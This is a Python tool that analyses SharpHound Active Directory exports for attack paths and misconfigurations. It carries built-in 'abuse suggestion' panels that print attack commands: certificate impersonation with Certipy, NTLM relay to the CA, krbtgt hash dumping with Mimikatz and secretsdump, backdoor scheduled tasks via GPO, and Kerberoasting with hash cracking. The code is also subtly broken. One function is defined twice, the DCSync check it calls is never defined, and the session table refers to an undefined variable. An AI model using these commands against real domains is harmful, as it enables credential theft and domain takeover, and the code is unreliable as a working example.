#!/usr/bin/env python3
import json
import os
import sys
import argparse
import networkx as nx
from collections import defaultdict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich import print as rprint
from tqdm import tqdm
import time

__version__ = "1.3.0"  # Feel free to update this as you make changes

console = Console()

# ────────────────────────────────────────────────
# Intro Banner
# ────────────────────────────────────────────────
def print_intro_banner(mode_str):
    console.rule(f"[bold magenta]BloodBash v{__version__} - SharpHound Offline Analyzer[/bold magenta]", style="magenta")
    
    console.print(Panel(
        f"""
Parses SharpHound JSON files → finds AD attack paths & misconfigurations

What it shows:
• High-value targets (admins, krbtgt, CAs, templates, NTAuth...)
• AD CS misconfigs (ESC1–ESC8)
• Dangerous ACLs & permissions
• DCSync / replication rights
• RBCD opportunities
• Kerberoastable & AS-REP roastable accounts
• Weak GPO rights
• Shortest paths to high-value targets (optional)
• Local admin / session summary (when data exists)

Abuse suggestions: Shown once per vulnerable category (when found)
Common tools: Certipy, Impacket, Rubeus, Mimikatz, SharpGPOAbuse, etc.

Mode: [cyan]{mode_str}[/cyan]
For authorized security testing / red teaming only.

Use --help for all options.
""",
        title="Quick Overview",
        border_style="bright_blue",
        padding=(1, 2)
    ))

    console.print("[bold]Color guide:[/bold]")
    console.print("  [red]Red[/red]          = Critical findings (ESCs, DCSync, dangerous rights)")
    console.print("  [yellow]Yellow[/yellow]       = Medium risk (weak GPOs, roastable accounts)")
    console.print("  [green]Green[/green]        = No issues / success / principals with rights")
    console.print("  [cyan]Cyan[/cyan]         = Object names, targets, templates, types, counts")
    console.print("  [magenta]Magenta[/magenta]      = Section headers & dividers only")
    console.print("  [dim]Dim[/dim]          = Minor notes or empty results\n")


# ────────────────────────────────────────────────
# Type Mapping (SharpHound v6+)
# ────────────────────────────────────────────────
TYPE_FROM_META = {
    "users": "User",
    "computers": "Computer",
    "groups": "Group",
    "gpos": "GPO",
    "ous": "OU",
    "domains": "Domain",
    "containers": "Container",
    "certtemplates": "Certificate Template",
    "enterprisecas": "Enterprise CA",
    "rootcas": "Root CA",
    "aiacas": "AIA CA",
    "ntauthstores": "NTAuth Store",
}

# ────────────────────────────────────────────────
# Abuse Suggestions Helper
# ────────────────────────────────────────────────
def print_abuse_panel(vuln_type: str):
    title = f"Abuse Suggestions: {vuln_type}"
    content = ""
    border = "red"

    if vuln_type == "ESC1-ESC8 (AD CS)":
        content = """
[bold red]Impact:[/bold red] Certificate-based privilege escalation (ESC1–ESC8) → impersonate users (often admins/DA), relay attacks, or obtain high-value certificates.

Common tools: Certipy[](https://github.com/ly4k/Certipy), ntlmrelayx.py (Impacket)

ESC1/ESC2/ESC6 examples:
certipy req -u lowpriv@domain.local -p 'Password!' -ca 'DOMAIN-CA' \\
    -template VulnerableTemplate -upn administrator@domain.local

ESC8 (NTAuth relay):
ntlmrelayx.py -t https://ca.domain.local/certsrv/certfnsh.asp --adcs --template VulnerableTemplate -smb2support

Warning: Requires network access to CA/DC + low-priv creds. Authorized testing only.
"""
    elif vuln_type == "DCSync":
        content = """
[bold red]Impact:[/bold red] Dump NTDS hashes (krbtgt, admins, etc.) → Golden Ticket, pass-the-hash, domain compromise.

Tools: Mimikatz or Impacket secretsdump

Mimikatz:
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

Impacket:
secretsdump.py domain/user:password@dc-ip -just-dc
secretsdump.py -just-dc-ntds domain/user:password@dc-ip
"""
    elif vuln_type == "GPO Abuse":
        content = """
[bold yellow]Impact:[/bold yellow] Modify GPO → deploy malicious scheduled tasks/scripts → code execution / priv esc on affected machines.

Tools: SharpGPOAbuse, pyGPOAbuse, PowerView

SharpGPOAbuse example:
SharpGPOAbuse.exe --gponame "VulnerableGPO" --computer "target$" --taskname "EvilTask" --task "powershell.exe -c evil.ps1"

PowerView:
New-GPOImmediateTask -TaskName "Backdoor" -Command "powershell.exe ..."
"""
    elif vuln_type == "Dangerous Permissions":
        content = """
[bold red]Impact:[/bold red] Varies by right — ResetPassword → account takeover; GenericAll → full control; WriteDacl → own object.

Common abuses:

- Reset/ForceChangePassword:
  net user target NewPass123! /domain

- GenericAll on user/group:
  Add yourself or reset password

- WriteDacl:
  Grant self GenericAll then proceed

Warning: Requires control of the principal with the dangerous right.
"""
    elif vuln_type == "Kerberoastable":
        content = """
[bold yellow]Impact:[/bold yellow] Request TGS → offline crack weak service account password.

Tool: Impacket

GetUserSPNs.py -request -outputfile hashes.txt domain/user:password@domain.local

Crack:
hashcat -m 13100 hashes.txt wordlist.txt
"""
    elif vuln_type == "AS-REP Roastable":
        content = """
[bold yellow]Impact:[/bold yellow] Request AS-REP without preauth → offline crack user hash.

Tools: Rubeus or Impacket

Rubeus:
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

Impacket:
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -dc-ip dc-ip

Crack (mode 18200):
hashcat -m 18200 hashes.asreproast wordlist.txt
"""
    elif vuln_type == "RBCD":
        content = """
[bold red]Impact:[/bold red] Resource-Based Constrained Delegation → S4U2Self/S4U2Proxy impersonation.

Tool: Impacket rbcd.py

rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' \\
    -action write -dc-ip dc-ip domain/user:password

Then use getST.py or Rubeus s4u.
"""

    if content:
        console.print(Panel(content, title=title, border_style=border))
    else:
        console.print(f"[dim]No abuse example defined for {vuln_type}[/dim]")


# ────────────────────────────────────────────────
# Loading & Graph Building
# ────────────────────────────────────────────────
def load_json_dir(directory):
    nodes = {}
    files = [f for f in os.listdir(directory) if f.lower().endswith('.json')]
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Loading JSON files...", total=len(files))
        for filename in files:
            path = os.path.join(directory, filename)
            try:
                with open(path, 'r', encoding='utf-8-sig') as f:
                    raw = json.load(f)
                    meta_type = raw.get("meta", {}).get("type", "").lower()
                    obj_type = TYPE_FROM_META.get(meta_type, "Unknown")

                    data = raw.get('data') or raw.get('Results') or raw.get('objects') or raw
                    if not isinstance(data, list):
                        data = [data]

                    for item in data:
                        oid = item.get('ObjectIdentifier')
                        if not oid:
                            # If no ObjectIdentifier, it's likely a relationship-only file
                            # Don't add as node, but keep the data for later edge processing
                            if 'start' in item and 'end' in item:
                                nodes[f"rel_{len(nodes)}"] = item  # temporary key
                            continue
                        if 'ObjectType' not in item and 'Type' not in item:
                            item['ObjectType'] = obj_type
                        props = item.get('Properties', {})
                        if 'type' in props and props['type']:
                            item['ObjectType'] = props['type']
                        nodes[oid] = item
            except Exception as e:
                console.print(f"[yellow]Warning: Failed to parse {filename}: {e}[/yellow]")
            progress.advance(task)
    console.print(f"[green]✓ Loaded {len(nodes)} objects from {len(files)} files[/green]")
    return nodes


def build_graph(nodes):
    G = nx.MultiDiGraph()
    name_to_oid = {}
    relationship_edges = []
    placeholder_counter = 0
    with tqdm(total=len(nodes), desc="Building graph", unit="node") as pbar:
        for oid, node in nodes.items():
            props = node.get('Properties', {}).copy()
            # Corrected property keys (fixed spelling for EDITF_ATTRIBUTESUBJECTALTNAME2)
            for key in ['EnrolleeSuppliesSubject', 'RequiresManagerApproval', 
                        'EDITF_ATTRIBUTESUBJECTALTNAME2', 'enrolleesuppliessubject', 
                        'requiresmanagerapproval', 'editf_attributesubjectaltname2']:
                if key in node:
                    props[key] = node[key]
            name = props.get('name') or props.get('Name') or oid
            name_norm = name.upper().split('@')[0]
            obj_type = (
                node.get('ObjectType') or node.get('Type') or props.get('type') or 'Unknown'
            ).capitalize()
            if not oid.startswith('rel_'):
                G.add_node(oid, name=name, type=obj_type, props=props)
                name_to_oid[name_norm] = oid
            data_items = node.get('data', []) if 'data' in node else []
            if not isinstance(data_items, list):
                data_items = [data_items] if data_items else []
            for rel in data_items:
                start = rel.get('start')
                end = rel.get('end')
                label = rel.get('label')
                if start and end and label:
                    relationship_edges.append((start, end, label))
            for key in ['MemberOf', 'AdminTo', 'HasSession', 'AllowedToAct', 'HasSIDHistory']:
                rels = node.get(key, [])
                if not isinstance(rels, list):
                    rels = [rels] if rels else []
                for rel in rels:
                    target = rel.get('ObjectIdentifier') if isinstance(rel, dict) else rel
                    if target and target in nodes:
                        G.add_edge(oid, target, label=key)
            aces = node.get('Aces', [])
            for ace in aces:
                principal = ace.get('PrincipalSID') or ace.get('PrincipalObjectIdentifier')
                right = ace.get('RightName')
                if principal and right and principal in nodes:
                    G.add_edge(principal, oid, label=right)
            pbar.update(1)
    console.print("[cyan]Processing standalone relationships...[/cyan]")
    added = 0
    placeholders_added = 0
    for start, end, label in relationship_edges:
        start_norm = start.upper().split('@')[0]
        end_norm = end.upper().split('@')[0]
        start_oid = None
        if start in G.nodes:
            start_oid = start
        elif start_norm in name_to_oid:
            start_oid = name_to_oid[start_norm]
        else:
            start_oid = f"placeholder_{placeholder_counter}"
            placeholder_counter += 1
            G.add_node(start_oid, name=start, type='Unknown', props={})
            name_to_oid[start_norm] = start_oid
            placeholders_added += 1
            console.print(f"[dim]Created placeholder node for start: {start} (OID: {start_oid})[/dim]")
        end_oid = None
        if end in G.nodes:
            end_oid = end
        elif end_norm in name_to_oid:
            end_oid = name_to_oid[end_norm]
        else:
            end_oid = f"placeholder_{placeholder_counter}"
            placeholder_counter += 1
            G.add_node(end_oid, name=end, type='Unknown', props={})
            name_to_oid[end_norm] = end_oid
            placeholders_added += 1
            console.print(f"[dim]Created placeholder node for end: {end} (OID: {end_oid})[/dim]")
        if start_oid and end_oid:
            G.add_edge(start_oid, end_oid, label=label)
            added += 1
            console.print(f"[dim]Added edge: {start_oid} --[{label}]--> {end_oid}[/dim]")
        else:
            console.print(f"[yellow]Skipped relationship {start} -> {end} ({label}): unexpected error[/yellow]")
    console.print(f"[green]Added {added} relationship edges ({placeholders_added} placeholder nodes created)[/green]")
    console.print(f"[green]✓ Graph built: {G.number_of_nodes()} nodes, {G.number_of_edges()} edges[/green]")
    return G, name_to_oid

# ────────────────────────────────────────────────
# VERBOSE SUMMARY
# ────────────────────────────────────────────────
def print_verbose_summary(G):
    console.rule("[bold magenta]VERBOSE SUMMARY[/bold magenta]")
    
    types_count = defaultdict(int)
    for _, d in G.nodes(data=True):
        types_count[d['type']] += 1

    table = Table(title="Object Types", show_header=True, header_style="bold cyan")
    table.add_column("Type", style="green")
    table.add_column("Count", justify="right", style="yellow")
    
    for t, cnt in sorted(types_count.items(), key=lambda x: x[1], reverse=True):
        table.add_row(t, str(cnt))
    
    console.print(table)

    users = [d['name'] for _, d in G.nodes(data=True) if d['type'] == 'User']
    if users:
        console.print(f"\n[bold cyan]Users ({len(users)}):[/bold cyan]")
        for name in sorted(users)[:30]:
            console.print(f"  • {name}")
        if len(users) > 30:
            console.print(f"  ... and {len(users)-30} more")
    else:
        console.print("\n[yellow]No User objects found[/yellow]")

# ────────────────────────────────────────────────
# Helpers
# ────────────────────────────────────────────────
def get_high_value_targets(G):
    keywords = [
        'domain admins', 'enterprise admins', 'schema admins', 'administrators',
        'krbtgt', 'domain controllers', 'dnsadmins', 'enterprise key admins',
        'certificate template', 'enterprise ca', 'root ca', 'ntauth','dc'
    ]
    targets = []
    for n, d in G.nodes(data=True):
        name = d['name'].lower()
        typ = d['type'].lower()
        if any(k in name for k in keywords) or 'ca' in typ or 'template' in typ or 'ntauth' in typ:
            targets.append((n, d['name'], d['type']))
    return sorted(targets, key=lambda x: x[1])

def format_path(G, path):
    if len(path) < 2:
        return G.nodes[path[0]]['name']
    parts = []
    for i in range(len(path)-1):
        u, v = path[i], path[i+1]
        edges = G.get_edge_data(u, v)
        label = next(iter(edges.values()))['label'] if edges else '???'
        parts.append(f"[bold cyan]{G.nodes[u]['name']}[/bold cyan] --[[yellow]{label}[/yellow]]-->")
    parts.append(f"[bold red]{G.nodes[path[-1]]['name']}[/bold red]")
    return " ".join(parts)

# ────────────────────────────────────────────────
# ADCS ESC1–ESC8 (PATCHED VERSION)
# ────────────────────────────────────────────────
def print_adcs_vulnerabilities(G):
    console.rule("[bold magenta]ADCS ESC Vulnerabilities (ESC1–ESC8)[/bold magenta]")
    found = False
    
    def get_bool_prop(props, keys, default=False):
        for key in keys:
            val = props.get(key.lower(), props.get(key, None))
            if val is not None:
                return bool(val)
        return default
    
    for n, d in G.nodes(data=True):
        obj_type = d.get('type', 'Unknown').lower()
        if obj_type not in ['certificate template', 'enterprise ca', 'root ca', 'ntauth store']:
            continue
        name = d.get('name') or d.get('props', {}).get('name', n)
        props = d.get('props', {}) or {}
        # Copy top-level flags to props (corrected key spelling)
        for key in ['EDITF_ATTRIBUTESUBJECTALTNAME2', 'EDITF_ATTRIBUTESUBJECTALTNAME2']:
            if key in d and key not in props:
                props[key] = d[key]
        incoming = list(G.in_edges(n, data=True))
        rights = {edge_data['label'] for _, _, edge_data in incoming}
        
        # Corrected defaults: RequiresManagerApproval defaults to False (permissive AD CS)
        enrollee_supplies = get_bool_prop(props, ['enrolleesuppliessubject', 'EnrolleeSuppliesSubject'])
        requires_mgr_approval = get_bool_prop(props, ['requiresmanagerapproval', 'RequiresManagerApproval'], default=False)
        no_approval = not requires_mgr_approval
        editf_san2 = get_bool_prop(props, ['editf_attributesubjectaltname2', 'EDITF_ATTRIBUTESUBJECTALTNAME2'])
        
        # EKUs for ESC5/7 (placeholders; not in test data)
        ekus = props.get('ekus', []) or props.get('mspki-certificate-application-policy', [])
        has_cert_request_agent = '1.3.6.1.4.1.311.20.2.1' in ekus
        has_web_server = '1.3.6.1.5.5.7.3.1' in ekus
        
        # ESC1/2
        if obj_type == 'certificate template':
            if 'Enroll' in rights and enrollee_supplies and no_approval:
                found = True
                console.print(f"[red]ESC1/ESC2[/red]: [bold cyan]{name}[/bold cyan] (Enroll + EnrolleeSuppliesSubject + no approval)")
                for u, _, edge in incoming:
                    if edge['label'] == 'Enroll':
                        console.print(f"  → [green]{G.nodes[u]['name']}[/green] can Enroll")
        
        # ESC3
        if obj_type == 'certificate template' and no_approval:
            dangerous = {'GenericAll', 'WriteDacl', 'WriteOwner', 'GenericWrite'}
            dangerous_found = dangerous & rights
            if dangerous_found:
                found = True
                console.print(f"[red]ESC3[/red]: [bold cyan]{name}[/bold cyan] (no approval + dangerous rights)")
                for u, _, edge in incoming:
                    if edge['label'] in dangerous_found:
                        console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[{edge['label']}]-->")
        
        # ESC4
        if obj_type in ['certificate template', 'enterprise ca', 'root ca']:
            dangerous = {'GenericAll', 'WriteDacl', 'WriteOwner', 'GenericWrite'}
            dangerous_found = dangerous & rights
            if dangerous_found:
                found = True
                console.print(f"[red]ESC4[/red]: [bold cyan]{name}[/bold cyan] (dangerous rights on PKI object)")
                for u, _, edge in incoming:
                    if edge['label'] in dangerous_found:
                        console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[{edge['label']}]-->")
        
        # ESC5 (placeholder)
        if obj_type == 'certificate template' and has_cert_request_agent:
            found = True
            console.print(f"[red]ESC5[/red]: [bold cyan]{name}[/bold cyan] (Certificate Request Agent EKU)")
            for u, _, edge in incoming:
                if edge['label'] == 'Enroll':
                    console.print(f"  → [green]{G.nodes[u]['name']}[/green] can Enroll")
        
        # ESC6 (fixed: checks Enroll on CA)
        if obj_type == 'enterprise ca' and editf_san2 and 'Enroll' in rights:
            found = True
            console.print(f"[red]ESC6[/red]: [bold cyan]{name}[/bold cyan] (EDITF_ATTRIBUTESUBJECTALTNAME2 + Enroll)")
            for u, _, edge in incoming:
                if edge['label'] == 'Enroll':
                    console.print(f"  → [green]{G.nodes[u]['name']}[/green] can Enroll")
        
        # ESC7 (placeholder)
        if obj_type == 'certificate template' and has_web_server:
            found = True
            console.print(f"[red]ESC7[/red]: [bold cyan]{name}[/bold cyan] (HTTP Certificate - Web Server EKU)")
            for u, _, edge in incoming:
                if edge['label'] == 'Enroll':
                    console.print(f"  → [green]{G.nodes[u]['name']}[/green] can Enroll")
        
        # ESC8
        if obj_type == 'ntauth store' and 'GenericAll' in rights:
            found = True
            console.print(f"[red]ESC8[/red]: [bold cyan]{name}[/bold cyan] (GenericAll on NTAuth)")
            for u, _, edge in incoming:
                if edge['label'] == 'GenericAll':
                    console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[GenericAll]-->")
    
    if found:
        print_abuse_panel("ESC1-ESC8 (AD CS)")
    else:
        console.print("[green]No obvious ESC1–ESC8 misconfigurations detected[/green]")
        console.print("[yellow]Note: If no edges/rights are shown above, the relationships are not connected in the graph (likely ObjectIdentifier mismatch).[/yellow]")

# ────────────────────────────────────────────────
# GPO Abuse
# ────────────────────────────────────────────────
def print_gpo_abuse(G):
    console.rule("[bold magenta]GPO Abuse Risks[/bold magenta]")
    found = False
    high_value_keywords = ['domain controllers', 'domain admins', 'enterprise admins', 'administrators', 'dc']
    
    for n, d in G.nodes(data=True):
        # Fix: Case-insensitive type check to handle 'Gpo' or 'gpo'
        if d['type'].lower() != 'gpo':
            continue
        name = d['name']
        incoming = list(G.in_edges(n, data=True))
        rights = {edge_data['label'].lower() for _, _, edge_data in incoming}  # Case-insensitive rights
        dangerous = {'genericall', 'writedacl', 'writeowner', 'genericwrite'}
        dangerous_found = dangerous & rights
        
        if dangerous_found:
            # Check for high-risk scope: Look for GPO links to high-value OUs
            is_high_risk = False
            linked_ous = []
            # Traverse outgoing edges for links (e.g., 'GpLink')
            for _, target, edge_data in G.out_edges(n, data=True):
                if edge_data.get('label', '').lower() in ['gplink', 'linkedto']:  # Adjust if needed
                    ou_name = G.nodes[target].get('name', '').lower()
                    linked_ous.append(ou_name)
                    if any(kw in ou_name for kw in high_value_keywords):
                        is_high_risk = True
            
            found = True
            risk_color = "[red]" if is_high_risk else "[yellow]"
            scope_note = f" (High-risk: Linked to {', '.join(linked_ous)})" if linked_ous else " (No links detected - low risk)"
            console.print(f"{risk_color}Weak GPO{risk_color}: [bold cyan]{name}[/bold cyan]{scope_note}")
            for u, _, edge in incoming:
                label_lower = edge['label'].lower()
                if label_lower in dangerous:
                    principal_name = G.nodes[u]['name']
                    console.print(f"  → [green]{principal_name}[/green] --[{edge['label']}]-->")
    
    if found:
        print_abuse_panel("GPO Abuse")
    else:
        console.print("[green]No dangerous GPO rights found[/green]")

# ────────────────────────────────────────────────
# DCSync / Replication Rights
# ────────────────────────────────────────────────
def print_gpo_abuse(G):
    console.rule("[bold magenta]GPO Abuse Risks[/bold magenta]")
    found = False
    high_value_keywords = ['domain controllers', 'domain admins', 'enterprise admins', 'administrators', 'dc']
    
    for n, d in G.nodes(data=True):
        # Case-insensitive type check
        if d['type'].lower() != 'gpo':
            continue
        name = d['name']
        incoming = list(G.in_edges(n, data=True))
        console.print(f"[dim]Debug: Processing GPO {name} with {len(incoming)} incoming edges[/dim]")
        if incoming:
            console.print(f"[dim]Debug: Edges: {[(G.nodes[u]['name'], edge['label']) for u, _, edge in incoming]}[/dim]")
        rights = {edge_data['label'].lower() for _, _, edge_data in incoming}
        dangerous = {'genericall', 'writedacl', 'writeowner', 'genericwrite'}
        dangerous_found = dangerous & rights
        console.print(f"[dim]Debug: Rights found: {rights}, Dangerous: {dangerous_found}[/dim]")
        
        if dangerous_found:
            # Check for high-risk scope
            is_high_risk = False
            linked_ous = []
            out_edges = list(G.out_edges(n, data=True))
            console.print(f"[dim]Debug: Outgoing edges for {name}: {[(G.nodes[target]['name'], edge['label']) for _, target, edge in out_edges]}[/dim]")
            for _, target, edge_data in out_edges:
                if edge_data.get('label', '').lower() in ['gplink', 'linkedto']:
                    ou_name = G.nodes[target].get('name', '').lower()
                    linked_ous.append(ou_name)
                    if any(kw in ou_name for kw in high_value_keywords):
                        is_high_risk = True
            
            found = True
            risk_color = "[red]" if is_high_risk else "[yellow]"
            scope_note = f" (High-risk: Linked to {', '.join(linked_ous)})" if linked_ous else " (No links detected - low risk)"
            console.print(f"{risk_color}Weak GPO{risk_color}: [bold cyan]{name}[/bold cyan]{scope_note}")
            for u, _, edge in incoming:
                label_lower = edge['label'].lower()
                if label_lower in dangerous:
                    principal_name = G.nodes[u]['name']
                    console.print(f"  → [green]{principal_name}[/green] --[{edge['label']}]-->")
    
    if found:
        print_abuse_panel("GPO Abuse")
    else:
        console.print("[green]No dangerous GPO rights found[/green]")

# ────────────────────────────────────────────────
# RBCD
# ────────────────────────────────────────────────
def print_rbcd(G):
    console.rule("[bold magenta]Resource-Based Constrained Delegation (RBCD)[/bold magenta]")
    found = False

    for n, d in G.nodes(data=True):
        if d['type'] != 'Computer':
            continue
        props = d['props']
        if props.get('msds-allowedtodelegateto', []):
            found = True
            console.print(f"  • [bold cyan]{d['name']}[/bold cyan] allows delegation from:")
            for tgt in props['msds-allowedtodelegateto']:
                console.print(f"      - {tgt}")

    if found:
        print_abuse_panel("RBCD")
    else:
        console.print("[green]No RBCD configured computers found[/green]")

# ────────────────────────────────────────────────
# Shortest Paths
# ────────────────────────────────────────────────
def print_shortest_paths(G, max_paths=5, target_filter=None):
    console.rule("[bold magenta]Shortest Paths to High-Value Targets[/bold magenta]")
    users = [n for n, d in G.nodes(data=True) if d['type'] == 'User']
    targets = get_high_value_targets(G)

    if target_filter:
        targets = [t for t in targets if target_filter.lower() in t[1].lower()]

    if not targets:
        console.print("[yellow]No high-value targets found[/yellow]")
        return

    for tid, tname, ttype in targets[:5]:
        console.print(f"\n[bold]Target:[/bold] [bold cyan]{tname}[/bold cyan] ({ttype})")
        count = 0
        for source in users:
            if source == tid or not nx.has_path(G, source, tid):
                continue
            try:
                path = nx.shortest_path(G, source, tid)
                console.print(f"  [dim]→[/dim] {format_path(G, path)}")
                count += 1
                if count >= max_paths:
                    break
            except nx.NetworkXNoPath:
                pass
        if count == 0:
            console.print("    [dim]No paths found[/dim]")

# ────────────────────────────────────────────────
# Dangerous Permissions
# ────────────────────────────────────────────────
def print_dangerous_permissions(G):
    console.rule("[bold magenta]Dangerous Permissions on High-Value Objects[/bold magenta]")
    dangerous_rights = {
        'GenericAll', 'Owns', 'WriteDacl', 'WriteOwner', 'AllExtendedRights',
        'GenericWrite', 'AddMember', 'ResetPassword', 'ForceChangePassword',
        'ManageCA', 'ManageCertificates', 'Enroll', 'CertificateEnroll', 'WriteProperty'
    }
    targets = get_high_value_targets(G)
    found = False

    for tid, tname, ttype in targets:
        incoming = G.in_edges(tid, data=True)
        dangerous_edges = [
            (u, d['label']) for u, v, d in incoming if d['label'] in dangerous_rights
        ]
        if dangerous_edges:
            found = True
            console.print(f"\n[bold cyan]{tname} ({ttype}):[/bold cyan]")
            for principal_oid, right in dangerous_edges:
                principal_name = G.nodes[principal_oid]['name']
                console.print(f"  • [green]{principal_name}[/green] --[[yellow]{right}[/yellow]]--> [cyan]{tname}[/cyan]")

    if found:
        print_abuse_panel("Dangerous Permissions")
    else:
        console.print("[green]No dangerous ACLs found on high-value objects[/green]")

# ────────────────────────────────────────────────
# Kerberoastable & AS-REP Roastable
# ────────────────────────────────────────────────
def print_kerberoastable(G):
    console.rule("[bold magenta]Kerberoastable Accounts[/bold magenta]")
    found = False
    for n, d in G.nodes(data=True):
        if d['type'] != 'User':
            continue
        props = d.get('props', {})
        if props.get('hasspn', False) and not props.get('sensitive', False) and props.get('enabled', True):
            found = True
            console.print(f"  • [cyan]{d['name']}[/cyan]")

    if found:
        print_abuse_panel("Kerberoastable")
    else:
        console.print("[green]None found[/green]")

def print_as_rep_roastable(G):
    console.rule("[bold magenta]AS-REP Roastable Accounts (DONT_REQ_PREAUTH)[/bold magenta]")
    found = False
    for n, d in G.nodes(data=True):
        if d['type'] != 'User':
            continue
        props = d.get('props', {})
        if props.get('dontreqpreauth', False) and props.get('enabled', True):
            found = True
            console.print(f"  • [cyan]{d['name']}[/cyan]")

    if found:
        print_abuse_panel("AS-REP Roastable")
    else:
        console.print("[green]None found[/green]")

# ────────────────────────────────────────────────
# Sessions / LocalAdmin
# ────────────────────────────────────────────────
def print_sessions_localadmin(G):
    console.rule("[bold magenta]Session / LocalAdmin Summary[/bold magenta]")
    computers = [n for n, d in G.nodes(data=True) if d['type'] == 'Computer']
    if not computers:
        console.print("[yellow]No computers with session data[/yellow]")
        return

    table = Table(title="Top Local Admins", show_header=True, header_style="bold magenta")
    table.add_column("Principal", style="cyan")
    table.add_column("Count", justify="right")
    table.add_column("Examples", style="green")

    from collections import Counter
    admin_edges = [e for e in G.edges(data=True) if e[2].get('label') == 'LocalAdmin']
    counts = Counter(u for u, _, _ in admin_edges)
    
    for principal, count in counts.most_common(10):
        examples = [G.nodes[v]['name'] for _, v, d in admin_edges if u == principal][:3]
        table.add_row(G.nodes[principal]['name'], str(count), ", ".join(examples))

    console.print(table)

# ────────────────────────────────────────────────
# Export
# ────────────────────────────────────────────────
def export_results(G, output_prefix="bashound", format_type="md"):
    if format_type == "md":
        path = f"{output_prefix}.md"
        with open(path, "w", encoding="utf-8") as f:
            f.write("# BashHound Report\n\n")
            f.write("## High-Value Targets\n")
            for _, name, typ in get_high_value_targets(G):
                f.write(f"- {name} ({typ})\n")
            f.write("\n## Sample Paths\n")
            # Simplified - add more if desired
        console.print(f"[green]Exported Markdown:[/green] {path}")

    elif format_type == "json":
        path = f"{output_prefix}.json"
        summary = {
            "nodes": G.number_of_nodes(),
            "edges": G.number_of_edges(),
            "high_value": [
                {"name": d['name'], "type": d['type']} for _, d in G.nodes(data=True)
                if any(k in d['name'].lower() for k in ['admin', 'krbtgt', 'ca', 'template'])
            ]
        }
        with open(path, "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=2)
        console.print(f"[green]Exported JSON:[/green] {path}")

# ────────────────────────────────────────────────
# Main
# ────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="BloodBash - Advanced BloodHound Analyzer with Abuse Suggestions")
    parser.add_argument('directory', nargs='?', default='.', help='Path to SharpHound JSON files')

    parser.add_argument('--shortest-paths', action='store_true')
    parser.add_argument('--dangerous-permissions', action='store_true')
    parser.add_argument('--adcs', action='store_true')
    parser.add_argument('--gpo-abuse', action='store_true')
    parser.add_argument('--dcsync', action='store_true')
    parser.add_argument('--rbcd', action='store_true')
    parser.add_argument('--sessions', action='store_true')
    parser.add_argument('--kerberoastable', action='store_true')
    parser.add_argument('--as-rep-roastable', action='store_true')
    parser.add_argument('--verbose', action='store_true')
    parser.add_argument('--all', action='store_true')
    parser.add_argument('--export', nargs='?', const='md', choices=['md', 'json'], help='Export results')
    parser.add_argument('--fast', action='store_true', help='Fast mode (skip heavy pathfinding)')

    args = parser.parse_args()

    start_time = time.time()

    nodes = load_json_dir(args.directory)
    if not nodes:
        console.print("[red]No objects loaded. Exiting.[/red]")
        sys.exit(1)

    G, _ = build_graph(nodes)

    # Determine mode string for banner
    if args.all:
        mode_str = "Full analysis (--all)"
    elif any([args.shortest_paths, args.dangerous_permissions, args.adcs, args.gpo_abuse,
              args.dcsync, args.rbcd, args.sessions, args.kerberoastable, args.as_rep_roastable]):
        mode_str = "Selected checks"
    else:
        mode_str = "Default (verbose summary + common checks)"

    print_intro_banner(mode_str)

    run_all = args.all or not any([
        args.shortest_paths, args.dangerous_permissions, args.adcs, args.gpo_abuse,
        args.dcsync, args.rbcd, args.sessions, args.kerberoastable, args.as_rep_roastable
    ])

    if args.verbose or run_all:
        print_verbose_summary(G)

    if args.shortest_paths or run_all:
        if not args.fast:
            print_shortest_paths(G)

    if args.dangerous_permissions or run_all:
        print_dangerous_permissions(G)

    if args.adcs or run_all:
        print_adcs_vulnerabilities(G)

    if args.gpo_abuse or run_all:
        print_gpo_abuse(G)

    if args.dcsync or run_all:
        print_dcsync_rights(G)

    if args.rbcd or run_all:
        print_rbcd(G)

    if args.sessions or run_all:
        print_sessions_localadmin(G)

    if args.kerberoastable or run_all:
        print_kerberoastable(G)

    if args.as_rep_roastable or run_all:
        print_as_rep_roastable(G)

    if args.export:
        export_results(G, format_type=args.export)

    elapsed = time.time() - start_time
    console.print(f"\n[italic green]Completed in {elapsed:.2f} seconds[/italic green]")

if __name__ == '__main__':
    main()
